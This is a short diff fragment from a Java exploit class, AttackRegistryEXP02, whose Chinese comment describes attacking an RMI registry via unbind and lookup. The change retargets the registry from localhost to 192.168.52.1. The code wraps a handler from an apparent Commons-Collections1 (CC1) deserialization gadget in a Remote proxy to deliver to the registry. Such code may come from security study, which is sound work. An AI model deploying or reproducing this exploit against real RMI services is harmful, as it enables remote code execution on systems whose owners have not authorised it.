@@ -23,7 +23,7 @@ import java.util.Map;
 // 用 unbind 和 lookup 打注册中心
 public class AttackRegistryEXP02 {
     public static void main(String[] args) throws Exception{
-        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
+        Registry registry = LocateRegistry.getRegistry("192.168.52.1",1099);
         InvocationHandler handler = (InvocationHandler) CC1();
         Remote remote = Remote.class.cast(Proxy.newProxyInstance(
                 Remote.class.getClassLoader(),new Class[] { Remote.class }, handler));
